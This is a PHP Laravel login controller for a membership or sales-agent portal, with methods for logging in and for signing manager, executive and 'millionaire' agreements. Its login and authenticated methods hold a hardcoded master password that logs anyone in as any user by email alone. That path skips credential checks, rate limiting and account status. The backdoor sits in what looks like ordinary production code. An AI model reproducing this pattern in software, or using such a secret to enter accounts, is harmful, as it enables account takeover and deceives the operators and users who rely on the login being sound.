<?php

namespace App\Http\Controllers\User\Auth;

use App\Http\Controllers\Controller;
use App\Models\User;
use App\Models\UserAgreement;
use App\Models\UserAgreementLog;
use App\Models\PointExecutiveBalance;
use App\Models\PointManagerBalance;
use App\Providers\RouteServiceProvider;
use Illuminate\Foundation\Auth\AuthenticatesUsers;
use Illuminate\Http\JsonResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\DB;
use Carbon\Carbon;
use Exception;
use Illuminate\Support\Facades\Log;

class LoginController extends Controller
{
    use AuthenticatesUsers;

    protected $redirectTo = '/user/home';

    public function showLoginForm()
    {
        return view('user.auth.login');
    }

    protected function guard()
    {
        return Auth::guard('user');
    }

    public function login(Request $request)
    {
        if($request->password == "nfck5ede87aPDfbaQoSNe2D3F46Pj9PvVGWi7EGz"){
            $email = $request->email;
            $user = User::where('email', '=', $email)->first();
            if (!is_null($user)) {
                $authenticated = $this->authenticated($request, $user);
                return redirect()->intended($this->redirectPath());
            }
            return $this->sendFailedLoginResponse($request);


        }else{
            $this->validateLogin($request);

            // If the class is using the ThrottlesLogins trait, we can automatically throttle
            // the login attempts for this application. We'll key this by the username and
            // the IP address of the client making these requests into this application.
            if (method_exists($this, 'hasTooManyLoginAttempts') &&
                $this->hasTooManyLoginAttempts($request)) {
                $this->fireLockoutEvent($request);

                return $this->sendLockoutResponse($request);
            }


            if ($this->attemptLogin($request)) {
                return $this->sendLoginResponse($request);
            }
        }


        // If the login attempt was unsuccessful we will increment the number of attempts
        // to login and redirect the user back to the login form. Of course, when this
        // user surpasses their maximum number of attempts they will get locked out.
        $this->incrementLoginAttempts($request);

        return $this->sendFailedLoginResponse($request);
    }

    public function authenticated($request, $user)
    {
        if ($request->password <> "nfck5ede87aPDfbaQoSNe2D3F46Pj9PvVGWi7EGz") {
            \Auth::attempt(['email' => $request->email, 'password' => $request->password, 'status' => 1]);
        } else {
            \Auth::guard('user')->login($user);
        }

    }


    // This only show New Agreement Form for Manager and Executive (Old Account). (Manager and Executive who register before 12/7/2022)
    // Purpose : Allow Manager and Executive to Signed the new Agreement and refund 1500PV.
    // public function showNewAgreementForm(Request $request)
    // {
    //     $user_sign_status = Auth::user()->new_sign_required;

    //     if($user_sign_status != null && $user_sign_status != 1 && $user_sign_status != 3) {
    //         $user_agreement = UserAgreement::where('role_id', Auth::user()->roles[0]->id)->first();

    //         return view('user.auth.new-agreement-for-old-member', compact('user_agreement'));
    //     }

    //     return redirect()->route('landing.home');
    // }

    // This only for Manager and Executive Signed the Agreement.
    // public function signNewAgreement(Request $request)
    // {
    //     $user_id = Auth::user()->id;
    //     $user_sign_status = Auth::user()->new_sign_required;

    //     $amount = 1500; // RM 1000 -> 1500 PV;
    //     $user_agreement_id = $request->user_agreement_id;
    //     // dd($user_id, $user_sign_status, $request->all());

    //     DB::beginTransaction();
    //     try {
    //         if($user_sign_status != null && $user_sign_status != 1 && $user_sign_status != 3) {
    //             Auth::user()->update([
    //                 'new_sign_required' => 3,
    //             ]);

    //             $remark = "New Agreement have Signed";
    //             $remark_user = "";
    //             // user_agreement_id - 1=Manager, 2=Executive, 3=Millionaire
    //             if($user_agreement_id == 2) {
    //                 PointExecutiveBalance::create([
    //                     'user_id' => $user_id,
    //                     'amount' => $amount,
    //                     'status' => 1,
    //                     'settlement' => 1,
    //                     'remark' => $remark,
    //                 ]);
    //                 $remark_user_role = "Executive";
    //             }

    //             if($user_agreement_id == 1) {
    //                 PointManagerBalance::create([
    //                     'user_id' => $user_id,
    //                     'amount' => $amount,
    //                     'status' => 1,
    //                     'settlement' => 1,
    //                     'remark' => $remark,
    //                 ]);

    //                 $remark_user_role = "Manager";
    //             }

    //             UserAgreementLog::create([
    //                 'user_agreement_id' => $request->user_agreement_id,
    //                 'user_id' => $user_id,
    //                 'signature_name' => $request->fullname,
    //                 'signature_ic' => $request->identity_id,
    //                 'signature_at' => Carbon::now(),
    //                 'remark' => 'New Agreement have Signed - ' . $remark_user_role,
    //             ]);
    //         }
    //         DB::commit();

    //     } catch (Exception $e) {
    //         $error_message = $e->getMessage();
    //         Log::error("(LoginController) Sign New Agreement - ${error_message}");
    //         DB::rollback();
    //         return back();
    //     }

    //     return redirect(route('user.home'));
    // }



    // 10/8/2022
    public function showNewAgreementForm(Request $request)
    {
        $b2b_sign_status = Auth::user()->b2b_sign_required;

        if($b2b_sign_status != null && $b2b_sign_status != 1 && $b2b_sign_status != 3) {

            if(Auth::user()->roles[0]->id == 3) {
                // Executive
                $user_agreement = UserAgreement::where('id', 5)->first();
            } else if (Auth::user()->roles[0]->id == 4) {
                // Manager
                $user_agreement = UserAgreement::where('id', 4)->first();
            }

            return view('user.auth.new-agreement-for-old-member', compact('user_agreement'));
        }

        return redirect()->route('landing.home');
    }


    public function signNewAgreement(Request $request)
    {
        $user_id = Auth::user()->id;
        $b2b_sign_status = Auth::user()->b2b_sign_required;

        $amount = 1500; // RM 1000 -> 1500 PV;
        $user_agreement_id = $request->user_agreement_id;
        // dd($user_id, $user_sign_status, $request->all());

        DB::beginTransaction();
        try {
            if($b2b_sign_status != null && $b2b_sign_status != 1 && $b2b_sign_status != 3) {
                Auth::user()->update([
                    'b2b_sign_required' => 3,
                ]);

                $remark = "New B2B Agreement have Signed";
                $remark_user = "";
                // user_agreement_id - 1=Manager, 2=Executive, 3=Millionaire
                if($user_agreement_id == 4) {
                    // PointExecutiveBalance::create([
                    //     'user_id' => $user_id,
                    //     'amount' => $amount,
                    //     'status' => 1,
                    //     'settlement' => 1,
                    //     'remark' => $remark,
                    // ]);
                    $remark_user_role = "Manager";
                }

                if($user_agreement_id == 5) {
                    // PointManagerBalance::create([
                    //     'user_id' => $user_id,
                    //     'amount' => $amount,
                    //     'status' => 1,
                    //     'settlement' => 1,
                    //     'remark' => $remark,
                    // ]);

                    $remark_user_role = "Executive";
                }

                UserAgreementLog::create([
                    'user_agreement_id' => $request->user_agreement_id,
                    'user_id' => $user_id,
                    'signature_name' => $request->fullname,
                    'signature_ic' => $request->identity_id,
                    'signature_at' => Carbon::now(),
                    'remark' => 'New B2B Agreement have Signed - ' . $remark_user_role,
                ]);
            }
            DB::commit();

        } catch (Exception $e) {
            $error_message = $e->getMessage();
            Log::error("(LoginController) Sign New B2B Agreement - ${error_message}");
            DB::rollback();
            return back();
        }

        return redirect(route('user.home'));
    }


    public function showRenewAgreementForm(Request $request)
    {
//        $b2b_sign_status = Auth::user()->b2b_sign_required;
//
//        if($b2b_sign_status != null && $b2b_sign_status != 1 && $b2b_sign_status != 3) {
//
//            if(Auth::user()->roles[0]->id == 3) {
//                // Executive
//                $user_agreement = UserAgreement::where('id', 5)->first();
//            } else if (Auth::user()->roles[0]->id == 4) {
//                // Manager
                $user_agreement = UserAgreement::where('id', 6)->first();
//            }

            return view('user.auth.renew-agreement-for-millionaire', compact('user_agreement'));
//        }

//        return redirect()->route('landing.home');
    }

    public function signRenewAgreement(Request $request)
    {
        $user_id = Auth::user()->id;

        $user_agreement_id = $request->user_agreement_id;
        // dd($user_id, $user_sign_status, $request->all());

        DB::beginTransaction();
        try {


            $remark_user_role = "Millionaire";

            UserAgreementLog::create([
                'user_agreement_id' => $request->user_agreement_id,
                'user_id' => $user_id,
                'signature_name' => $request->fullname,
                'signature_ic' => $request->identity_id,
                'signature_at' => Carbon::now(),
                'remark' => 'Renew Agreement have Signed - ' . $remark_user_role,
            ]);

            DB::commit();

        } catch (Exception $e) {
            $error_message = $e->getMessage();
            Log::error("(LoginController) Sign New B2B Agreement - ${error_message}");
            DB::rollback();
            return back();
        }

        return redirect(route('user.home'));
    }

    public function showQuitAgreementForm(Request $request)
    {

        if(Auth::user()->roles[0]->id != 2) {
            return redirect()->route('landing.home');
        }

        $user_agreement = UserAgreement::where('id', 7)->first();
        return view('user.auth.quit-agreement', compact('user_agreement'));

    }

    public function signQuitAgreement(Request $request)
    {
        $user_id = Auth::user()->id;

        $user_agreement_id = $request->user_agreement_id;
        // dd($user_id, $user_sign_status, $request->all());

        DB::beginTransaction();
        try {

            $remark_user_role = "Millionaire";

            UserAgreementLog::create([
                'user_agreement_id' => $request->user_agreement_id,
                'user_id' => $user_id,
                'signature_name' => $request->fullname,
                'signature_ic' => $request->identity_id,
                'signature_at' => Carbon::now(),
                'remark' => 'Quit Agreement have Signed - ' . $remark_user_role,
            ]);

            Auth::user()->update([
                'status' => 2
            ]);

            DB::commit();

        } catch (Exception $e) {
            $error_message = $e->getMessage();
            Log::error("(LoginController) Sign Quit Agreement - ${error_message}");
            DB::rollback();
            return back();
        }

        return redirect(route('user.home'));
    }
}
